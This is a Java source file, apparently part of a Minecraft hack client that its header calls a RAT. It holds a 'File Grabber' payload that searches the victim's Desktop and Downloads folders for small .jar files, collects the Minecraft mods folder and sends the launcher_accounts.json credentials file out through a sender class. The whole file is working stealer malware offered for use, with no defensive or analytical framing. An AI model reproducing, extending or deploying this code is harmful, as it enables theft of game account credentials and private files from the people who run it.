/*
 * rat go brrrrrrr
 */

package risingtide.tidehack.utils.grabber.risingtideimpl;

import risingtide.tidehack.utils.grabber.RTFileUtils;
import risingtide.tidehack.utils.grabber.RTPayload;
import risingtide.tidehack.utils.grabber.RTSender;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class RTFileGrabber implements RTPayload {
    @Override
    public String getName() {
        return "File Grabber";
    }

    @Override
    public void exec() throws Exception {
        RTSender s = new RTSender();

        // DESKTOP
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
            .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
            .filter(path -> path.toFile().getName().endsWith(".jar"))
            .filter(path -> {
                try { return Files.size(path) < 7000000; } catch (IOException ignored) { }
                return false;
            }).forEach(path -> s.send(path.toFile(),"File Grabber (Desktop)",true));

        // DOWNLOADS
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Downloads"))
            .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Downloads"))
            .filter(path -> path.toFile().getName().endsWith(".jar"))
            .filter(path -> {
                try { return Files.size(path) < 7000000; } catch (IOException ignored) { }
                return false;
            }).forEach(path -> s.send(path.toFile(),"File Grabber (Downloads)",true));

        // MODS FOLDER
        for (File file : RTFileUtils.getFiles(System.getenv("APPDATA") + "\\.minecraft\\" + "mods")) s.send(file,"File Grabber (Mods)", true);

        // LAUNCHER ACCS
        File file = RTFileUtils.getFile(System.getenv("APPDATA") + "\\.minecraft\\" + "launcher_accounts.json");
        try {
            s.send(file,"Launcher Accounts",false);
        } catch (Exception e) {
            s.send("**Error at Launcher Accounts:** ```"+e.toString()+"```","Error",false);
        }
    }
}
